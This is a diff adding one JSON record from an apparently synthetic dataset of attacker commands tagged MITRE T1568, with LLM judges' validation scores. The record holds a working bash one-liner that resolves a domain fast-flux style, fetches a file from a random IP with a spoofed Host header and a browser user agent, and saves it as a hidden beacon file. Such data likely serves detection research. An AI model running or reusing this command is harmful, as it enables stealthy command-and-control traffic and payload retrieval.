@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "domain=\"cms-assets-cdn.net\"; ip=$(dig +short A \"$domain\" | awk 'BEGIN{srand()}{a[NR]=$1} END{if(NR)print a[int(rand()*NR)+1]}'); ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; [ -n \"$ip\" ] && wget -q --header=\"Host: $domain\" --user-agent=\"$ua\" --header=\"Accept: image/png,image/*;q=0.8\" --limit-rate=40k --timeout=8 --tries=2 \"http://$ip/img/logo.png\" -O /tmp/.ff_beacon",
+  "explanation": "Implements fast-flux style dynamic resolution by randomly selecting an A record at runtime and contacting the IP directly with a Host header to maintain virtual hosting semantics.",
+  "rationale_steps": [
+    "Resolve multiple A records and randomly select one (fast flux).",
+    "Send HTTP GET to the chosen IP with Host header set to the domain.",
+    "Use image-like path and normal UA to masquerade as asset retrieval."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-c1e3087f",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, correct command substitution, proper test and separators, and valid dig/awk/wget option usage.",
+        "semantic_score": 5,
+        "semantic_justification": "It dynamically resolves A records, randomly selects an endpoint at runtime, and contacts the IP with a Host header to preserve virtual hosting, aligning with fast-flux style dynamic resolution under T1568.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:53:37.638706Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats for both dig/awk and wget, and correct bash conditional syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements fast-flux dynamic resolution (T1568) by querying multiple A records at runtime, randomly selecting one IP, then contacting it directly with a spoofed Host header to maintain virtual hosting semantics, while using a realistic browser User-Agent and image-mimicking path to blend with legitimate traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:30:58.394264Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper bash syntax, correct variable assignments, balanced quotes, and valid flag structures for both dig and wget.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively demonstrates fast-flux style dynamic resolution by resolving multiple IPs, randomly selecting one, and using the Host header to maintain HTTP semantics while contacting the IP directly.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:31:04.220654Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
